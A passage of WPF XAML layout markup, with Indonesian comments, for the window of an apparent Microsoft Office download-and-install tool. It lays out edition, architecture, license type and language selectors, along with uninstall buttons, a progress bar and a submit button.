                        </StackPanel>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsChecked" Value="True">
                                <Setter TargetName="checkMark" Property="Visibility" Value="Visible"/>
                            </Trigger>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter Property="Opacity" Value="0.8"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <!-- Label dengan shadow pada background saja (teks tetap tajam) -->
        <Style x:Key="LabelWithBgShadow" TargetType="Label">
            <!-- Ketajaman teks -->
            <Setter Property="TextOptions.TextFormattingMode" Value="Display"/>
            <Setter Property="TextOptions.TextRenderingMode" Value="ClearType"/>
            <Setter Property="UseLayoutRounding" Value="True"/>
            <Setter Property="SnapsToDevicePixels" Value="True"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Label">
                        <Grid>
                            <!-- BACKGROUND + SHADOW (hanya latar, bukan teks) -->
                            <Border x:Name="Bg"
                  Background="{TemplateBinding Background}"
                  CornerRadius="3"
                  SnapsToDevicePixels="True">
                                <Border.Effect>
                                    <DropShadowEffect Color="Black"
                                BlurRadius="10"
                                ShadowDepth="3"
                                Opacity="0.6"
                                RenderingBias="Performance"/>
                                </Border.Effect>
                            </Border>

                            <!-- TEKS (lapisan terpisah; tidak kena effect) -->
                            <ContentPresenter Margin="{TemplateBinding Padding}"
                            HorizontalAlignment="Center"
                            VerticalAlignment="Center"
                            RecognizesAccessKey="True"
                            TextElement.FontFamily="{TemplateBinding FontFamily}"
                            TextElement.FontSize="{TemplateBinding FontSize}"
                            TextElement.Foreground="{TemplateBinding Foreground}"/>
                        </Grid>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

    </Window.Resources>


    <Grid HorizontalAlignment="Left" Background="{DynamicResource BackgroundColor}" Width="1154" Margin="0,0,0,0">
        <!-- Memulai animasi saat Window dimuat -->
        <!-- <Grid.Triggers>
            <EventTrigger RoutedEvent="Window.Loaded">
                <BeginStoryboard Storyboard="{StaticResource RotateStoryboard}" />
            </EventTrigger>
        </Grid.Triggers> -->
        <GroupBox x:Name="groupBoxMicrosoftOffice" Header="." Foreground="Transparent" BorderThickness="0" BorderBrush="Transparent" Background="{DynamicResource CanvasColor}" Margin="135,10,0,0" HorizontalAlignment="Left" VerticalAlignment="Top" Height="458" Width="1000" FontFamily="Consolas" FontSize="11">
            <Canvas HorizontalAlignment="Left" VerticalAlignment="Top">
                <!-- Border sebagai background dengan shadow -->
                <Border Width="135" Height="81" Background="{DynamicResource BorderBackgroud}"
            CornerRadius="10"
            HorizontalAlignment="Left" VerticalAlignment="Center"
            Canvas.Left="9" Canvas.Top="20">
                    <Border.Effect>
                        <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="4"/>
                    </Border.Effect>
                </Border>

                <!-- Label -->
                <Label x:Name="Label365" Style="{StaticResource LabelWithBgShadow}" Content="Microsoft 365" FontWeight="Bold"
           HorizontalAlignment="Left" VerticalAlignment="Center"
           Foreground="White" Padding="8,4,8,4"
           Background="#E53935" Canvas.Left="23" Canvas.Top="8"/>

                <!-- StackPanel untuk RadioButtons -->
                <StackPanel Orientation="Vertical" Canvas.Left="23" Canvas.Top="35" HorizontalAlignment="Left" VerticalAlignment="Center">
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton365Home" Content="Home" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton365Business" Content="Business" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton365Enterprise" Content="Enterprise" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                </StackPanel>

                <!-- Border sebagai background dengan shadow -->
                <Border Width="158" Height="305" Background="{DynamicResource BorderBackgroud}"
            CornerRadius="10"
            HorizontalAlignment="Left" VerticalAlignment="Center"
            Canvas.Left="154" Canvas.Top="20">
                    <Border.Effect>
                        <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="4"/>
                    </Border.Effect>
                </Border>

                <!-- Label -->
                <Label x:Name="Label2024" Style="{StaticResource LabelWithBgShadow}" Content="Office 2024" FontWeight="Bold"
                    HorizontalAlignment="Left" VerticalAlignment="Center"
                    Foreground="White" Padding="8,4,8,4"
                    Background="#FB8C00" Canvas.Left="168" Canvas.Top="8"/>

                <!-- StackPanel untuk RadioButtons -->
                <StackPanel Orientation="Vertical" Canvas.Left="168" Canvas.Top="40" HorizontalAlignment="Left" VerticalAlignment="Center">
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024Pro" Content="Professional Plus" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024Std" Content="Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024ProjectPro" Content="Project Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024ProjectStd" Content="Project Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024VisioPro" Content="Visio Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024VisioStd" Content="Visio Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024Word" Content="Word" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024Excel" Content="Excel" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024PowerPoint" Content="PowerPoint" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024Outlook" Content="Outlook" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024Access" Content="Access" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024Publisher" Content="Publisher" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024HomeStudent" Content="HomeStudent" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2024HomeBusiness" Content="HomeBusiness" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                </StackPanel>

                <!-- Border sebagai background dengan shadow -->
                <Border Width="158" Height="305" Background="{DynamicResource BorderBackgroud}"
                CornerRadius="10"
                HorizontalAlignment="Left" VerticalAlignment="Center" Canvas.Left="322" Canvas.Top="20">
                    <Border.Effect>
                        <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="4"/>
                    </Border.Effect>
                </Border>

                <!-- Label -->
                <Label x:Name="Label2021" Style="{StaticResource LabelWithBgShadow}" Content="Office 2021" FontWeight="Bold"
                    HorizontalAlignment="Left" VerticalAlignment="Center"
                    Foreground="White" Padding="8,4,8,4"
                    Background="#FF3C10DE" Canvas.Left="336" Canvas.Top="11"/>

                <!-- StackPanel untuk RadioButtons -->
                <StackPanel Orientation="Vertical" Canvas.Left="336" Canvas.Top="42" HorizontalAlignment="Left" VerticalAlignment="Center">
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021Pro" Content="Professional Plus" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021Std" Content="Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021ProjectPro" Content="Project Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021ProjectStd" Content="Project Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021VisioPro" Content="Visio Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021VisioStd" Content="Visio Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021Word" Content="Word" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021Excel" Content="Excel" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021PowerPoint" Content="PowerPoint" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021Outlook" Content="Outlook" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021Access" Content="Access" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021Publisher" Content="Publisher" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021HomeStudent" Content="HomeStudent" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2021HomeBusiness" Content="HomeBusiness" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                </StackPanel>

                <!-- Border sebagai background dengan shadow -->
                <Border Width="158" Height="305" Background="{DynamicResource BorderBackgroud}"
                    CornerRadius="10"
                    HorizontalAlignment="Left" VerticalAlignment="Center"
                    Canvas.Left="490" Canvas.Top="20">
                    <Border.Effect>
                        <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="4"/>
                    </Border.Effect>
                </Border>

                <!-- Label -->
                <Label x:Name="Label2019" Style="{StaticResource LabelWithBgShadow}" Content="Office 2019" FontWeight="Bold"
                    HorizontalAlignment="Left" VerticalAlignment="Top"
                    Foreground="White" Padding="8,4,8,4"
                    Background="#FF0F8E40"
                    Margin="503,8,0,0"/>

                <!-- StackPanel untuk RadioButtons -->
                <StackPanel Orientation="Vertical" Canvas.Left="503" Canvas.Top="38" HorizontalAlignment="Center" VerticalAlignment="Top">
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019Pro" Content="Professional Plus" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019Std" Content="Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019ProjectPro" Content="Project Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019ProjectStd" Content="Project Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019VisioPro" Content="Visio Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019VisioStd" Content="Visio Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019Word" Content="Word" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019Excel" Content="Excel" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019PowerPoint" Content="PowerPoint" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019Outlook" Content="Outlook" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019Access" Content="Access" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019Publisher" Content="Publisher" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019HomeStudent" Content="HomeStudent" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2019HomeBusiness" Content="HomeBusiness" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                </StackPanel>

                <!-- Border sebagai background dengan shadow -->
                <Border Width="158" Height="305" Background="{DynamicResource BorderBackgroud}"
                    CornerRadius="10"
                    HorizontalAlignment="Left" VerticalAlignment="Center"
                    Canvas.Left="658" Canvas.Top="20">
                    <Border.Effect>
                        <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="4"/>
                    </Border.Effect>
                </Border>

                <!-- Label -->
                <Label x:Name="Label2016" Style="{StaticResource LabelWithBgShadow}" Content="Office 2016" FontWeight="Bold"
                    HorizontalAlignment="Left" VerticalAlignment="Center"
                    Foreground="White" Padding="8,4,8,4"
                    Background="DarkSlateBlue" Canvas.Left="672" Canvas.Top="8"/>

                <!-- StackPanel untuk RadioButtons -->
                <StackPanel Orientation="Vertical" Canvas.Left="672" Canvas.Top="38" HorizontalAlignment="Center" VerticalAlignment="Top">
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016Pro" Content="Professional Plus" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016Std" Content="Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016ProjectPro" Content="Project Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016ProjectStd" Content="Project Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016VisioPro" Content="Visio Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016VisioStd" Content="Visio Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016Word" Content="Word" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016Excel" Content="Excel" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016PowerPoint" Content="PowerPoint" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016Outlook" Content="Outlook" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016Access" Content="Access" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016Publisher" Content="Publisher" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2016OneNote" Content="OneNote" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                </StackPanel>

                <!-- Border sebagai background dengan shadow -->
                <Border Width="158" Height="305" Background="{DynamicResource BorderBackgroud}"
                    CornerRadius="10"
                    HorizontalAlignment="Left" VerticalAlignment="Center"
                    Canvas.Left="826" Canvas.Top="20">
                    <Border.Effect>
                        <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="4"/>
                    </Border.Effect>
                </Border>

                <!-- Label -->
                <Label x:Name="Label2013" Style="{StaticResource LabelWithBgShadow}" Content="Office 2013" FontWeight="Bold"
                    HorizontalAlignment="Left" VerticalAlignment="Center"
                    Foreground="White" Padding="8,4,8,4"
                    Background="#7b24d3" Canvas.Left="840" Canvas.Top="8"/>

                <!-- StackPanel untuk RadioButtons -->
                <StackPanel Orientation="Vertical" Canvas.Left="840" Canvas.Top="38" HorizontalAlignment="Center" VerticalAlignment="Top">
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013Pro" Content="Professional" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013Std" Content="Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013ProjectPro" Content="Project Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013ProjectStd" Content="Project Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013VisioPro" Content="Visio Pro" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013VisioStd" Content="Visio Standard" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013Word" Content="Word" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013Excel" Content="Excel" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013PowerPoint" Content="PowerPoint" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013Outlook" Content="Outlook" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013Access" Content="Access" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                    <RadioButton GroupName="OfficeSKU" x:Name="radioButton2013Publisher" Content="Publisher" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
                </StackPanel>

                <Label x:Name="label1" Foreground="{DynamicResource TextColor}" Content=" + By default, this script installs the 64-bit version in English." Canvas.Top="347" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Left="-3" Padding="0,0,0,2"/>
                <Label x:Name="label2" Foreground="{DynamicResource TextColor}" Content=" + Default mode is Install. If you want to download only, select Download mode." Canvas.Top="367" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Left="-3" Padding="0,0,0,2"/>
                <Label x:Name="label3" Foreground="{DynamicResource TextColor}" Content=" + The downloaded files would be saved on the current user's desktop." Canvas.Top="386" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Left="-3" Padding="0,0,0,2"/>
                <Label x:Name="label4" Foreground="{DynamicResource TextColor}" Content=" + The script can download/install both Retail and Volume versions." Canvas.Top="404" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Left="-3" Padding="0,0,0,2"/>
                <Label x:Name="label5" Foreground="{DynamicResource TextColor}" Content=" + ReCreate by: SARGA X HINZDC AKA OLIH | Website: " Canvas.Top="423" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" Canvas.Left="-3" HorizontalAlignment="Center" VerticalAlignment="Top" Padding="0,0,0,2"/>

                <!-- Border sebagai background dengan shadow -->
                <Border Width="136" Height="141" Background="{DynamicResource BorderBackgroud}"
                    CornerRadius="10"
                    HorizontalAlignment="Center" VerticalAlignment="Top"
                    Canvas.Left="8" Canvas.Top="154">
                    <Border.Effect>
                        <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="4"/>
                    </Border.Effect>
                </Border>

                <!-- Label sebagai Header -->
                <Label x:Name="LabelRemoveAll" Style="{StaticResource LabelWithBgShadow}" Content="Remove All Apps" FontWeight="Bold"
           Foreground="White" Background="#D32F2F"
           Padding="8,4,8,4"
           HorizontalAlignment="Left" VerticalAlignment="Center" Canvas.Left="19" Canvas.Top="144"/>

                <!-- RadioButton -->
                <RadioButton x:Name="radioButtonRemoveAllApp" Content="I Agree (Caution!)" 
                 FontFamily="Consolas" FontSize="10" Foreground="{DynamicResource TextColor}"
                 VerticalContentAlignment="Center" 
                 IsChecked="False" Canvas.Left="20" Canvas.Top="174" HorizontalAlignment="Center" VerticalAlignment="Top"/>

                <!-- TextBlock sebagai informasi -->
                <TextBlock x:Name="textBoxRemoveAll" TextWrapping="Wrap"
               Text="*This option removes all installed Office apps." 
               FontSize="10" Foreground="#FFED551B"
               FontWeight="Bold"
               HorizontalAlignment="Center" VerticalAlignment="Top" Width="134" Canvas.Left="10" Canvas.Top="304"/>

                <Button x:Name="buttonRemoveAll" Content="Remove All"
                    Width="108" Height="27" BorderBrush="{x:Null}"
                    FontSize="10" HorizontalAlignment="Left"
                    Canvas.Left="22" Canvas.Top="194" VerticalAlignment="Center"
                    Style="{StaticResource RedButtonStyle}" Cursor="Hand"
                    ToolTipService.ShowDuration="5000" 
                    ToolTipService.InitialShowDelay="500">
                    <Button.ToolTip>
                        <ToolTip Content="Klik untuk mengapus semua aplikasi Office yang terinstall." />
                    </Button.ToolTip>
                </Button>
                <Button x:Name="buttonSARA" Content="SaRa"
                    Width="108" Height="27" BorderBrush="{x:Null}"
                    FontSize="10"
                    Canvas.Left="22" Canvas.Top="258"
                    Style="{StaticResource RedButtonStyle}" Cursor="Hand"
                    ToolTipService.ShowDuration="5000" 
                    ToolTipService.InitialShowDelay="500" HorizontalAlignment="Left" VerticalAlignment="Center">
                    <Button.ToolTip>
                        <ToolTip Content="Klik untuk mengapus semua aplikasi Office yang terinstall." />
                    </Button.ToolTip>
                </Button>
                <Button x:Name="buttonScrub" Content="Scrub All"
                    Width="108" Height="26" BorderBrush="{x:Null}"
                    FontSize="10"
                    Canvas.Left="22" Canvas.Top="227"
                    Style="{StaticResource RedButtonStyle}" Cursor="Hand"
                    ToolTipService.ShowDuration="5000" 
                    ToolTipService.InitialShowDelay="500" HorizontalAlignment="Left" VerticalAlignment="Center">
                    <Button.ToolTip>
                        <ToolTip Content="Klik untuk mengapus semua aplikasi Office yang terinstall." />
                    </Button.ToolTip>
                </Button>

                <Image x:Name="image" Panel.ZIndex="1" Height="80" Width="80" Canvas.Left="870" Canvas.Top="345" Source="https://raw.githubusercontent.com/hinzdc/get/refs/heads/main/image/office.ico" HorizontalAlignment="Left" VerticalAlignment="Top" Visibility="Hidden" RenderTransformOrigin="0.5,0.5">
                    <Image.RenderTransform>
                        <RotateTransform Angle="0"/>
                    </Image.RenderTransform>
                </Image>
                <Image x:Name="image2" Panel.ZIndex="2" Height="200" Width="129" Canvas.Left="511" Canvas.Top="263" Source="https://raw.githubusercontent.com/hinzdc/get/refs/heads/main/image/tom.png" HorizontalAlignment="Left" VerticalAlignment="Center" Visibility="Visible"/>
                <Border x:Name="submitBox" Width="382" Height="91" Background="{DynamicResource BorderBackgroud}"
        CornerRadius="10" BorderThickness="1" BorderBrush="#0c66e4"
        HorizontalAlignment="Left" VerticalAlignment="Center"
        Canvas.Left="602" Canvas.Top="340">
                    <Border.Effect>
                        <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="4"/>
                    </Border.Effect>
                </Border>


            </Canvas>
        </GroupBox>
        <!-- Border sebagai background dengan shadow -->
        <Border Width="115" Height="60" Background="{DynamicResource BorderBackgroud}"
            CornerRadius="10"
            HorizontalAlignment="Left" VerticalAlignment="Top"
            Canvas.Left="10" Canvas.Top="10" Margin="10,17,0,0">
            <Border.Effect>
                <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="3"/>
            </Border.Effect>
        </Border>

        <!-- Label -->
        <Label x:Name="LabelArch"  Content="Architecture" FontWeight="Bold"
           HorizontalAlignment="Left" VerticalAlignment="Top"
           Foreground="White" Padding="10,1,8,2"
           Background="#3283d6"
           Margin="-1,8,0,0" Width="90"/>

        <!-- StackPanel untuk RadioButtons -->
        <StackPanel Orientation="Vertical" Margin="20,28,1035,403">
            <RadioButton x:Name="radioButtonArch64" Content="x64" Foreground="{DynamicResource TextColor}" FontFamily="Consolas" Margin="0,5,0,0" IsChecked="True"/>
            <RadioButton x:Name="radioButtonArch32" Content="x32" Foreground="{DynamicResource TextColor}" FontFamily="Consolas" Margin="0,5,0,0"/>
        </StackPanel>

        <!-- Border sebagai background dengan shadow -->
        <Border Width="115" Height="60" Background="{DynamicResource BorderBackgroud}"
            CornerRadius="10"
            HorizontalAlignment="Left" VerticalAlignment="Top"
            Canvas.Left="10" Canvas.Top="87" Margin="10,91,0,0">
            <Border.Effect>
                <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="3"/>
            </Border.Effect>
        </Border>

        <!-- Label -->
        <Label x:Name="LabelLicenseType" Content="License Type" FontWeight="Bold"
           HorizontalAlignment="Left" VerticalAlignment="Top"
           Foreground="White" Padding="10,1,8,2"
           Background="#3283d6"
           Margin="0,82,0,0" RenderTransformOrigin="0.387,0.53"/>

        <!-- StackPanel untuk RadioButtons -->
        <StackPanel Orientation="Vertical" Margin="20,104,1035,332">
            <RadioButton x:Name="radioButtonRetail" Content="Retail" Foreground="{DynamicResource TextColor}" FontFamily="Consolas" Margin="0,5,0,0" IsChecked="True"/>
            <RadioButton x:Name="radioButtonVolume" Content="Volume" Foreground="{DynamicResource TextColor}" FontFamily="Consolas" Margin="0,5,0,0"/>
        </StackPanel>


        <!-- Border sebagai background dengan shadow -->
        <Border Width="115" Height="220" Background="{DynamicResource BorderBackgroud}"
            CornerRadius="10"
            HorizontalAlignment="Left" VerticalAlignment="Top"
            Canvas.Left="10" Canvas.Top="239" Margin="10,247,0,0">
            <Border.Effect>
                <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="3"/>
            </Border.Effect>
        </Border>

        <!-- Label -->
        <Label x:Name="LabelLanguage" Content="Language" FontWeight="Bold"
           HorizontalAlignment="Left" VerticalAlignment="Top"
           Foreground="White" Padding="10,1,8,2"
           Background="#3283d6" Margin="0,238,0,0" Width="89"/>

        <!-- StackPanel untuk RadioButtons -->
        <StackPanel Orientation="Vertical" Margin="20,261,1035,18">
            <RadioButton x:Name="radioButtonEnglish" Content="English" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0" IsChecked="True"/>
            <RadioButton x:Name="radioButtonIndonesian" Content="Indonesian" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
            <RadioButton x:Name="radioButtonKorean" Content="Korean" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
            <RadioButton x:Name="radioButtonChinese" Content="Chinese" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
            <RadioButton x:Name="radioButtonFrench" Content="French" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
            <RadioButton x:Name="radioButtonSpanish" Content="Spanish" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
            <RadioButton x:Name="radioButtonGerman" Content="German" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
            <RadioButton x:Name="radioButtonJapanese" Content="Japanese" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
            <RadioButton x:Name="radioButtonVietnamese" Content="Vietnamese" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
            <RadioButton x:Name="radioButtonHindi" Content="Hindi" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
        </StackPanel>
        <Button x:Name="buttonSubmit" Content="SUBMIT" 
            Width="118" Height="59" 
            FontSize="15" FontWeight="Bold" HorizontalAlignment="Left" 
            Margin="989,381,0,0" VerticalAlignment="Top"
            Style="{StaticResource GreenButtonStyle}" Cursor="Hand"
            ToolTipService.ShowDuration="5000" 
            ToolTipService.InitialShowDelay="500">
            <Button.ToolTip>
                <ToolTip Content="Klik untuk menginstal atau mendownload office yang dipilih." />
            </Button.ToolTip>
        </Button>

        <ProgressBar x:Name="progressbar" HorizontalAlignment="Left" Height="15" Margin="760,384,0,0" VerticalAlignment="Top" Width="218" IsEnabled="False" Background="Gainsboro" BorderBrush="{x:Null}"/>
        <TextBox x:Name="textbox"  Foreground="{DynamicResource TextColor}" TextWrapping="Wrap" Text="Silakan pilih salah satu versi office yang ingin diinstall lalu klik SUBMIT." Width="218" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="760,406,0,0" FontFamily="Consolas" FontSize="11" HorizontalContentAlignment="Center" VerticalContentAlignment="Center" Background="{x:Null}" BorderBrush="{x:Null}" AllowDrop="False" Focusable="False" IsHitTestVisible="False" IsTabStop="False" IsUndoEnabled="False"/>
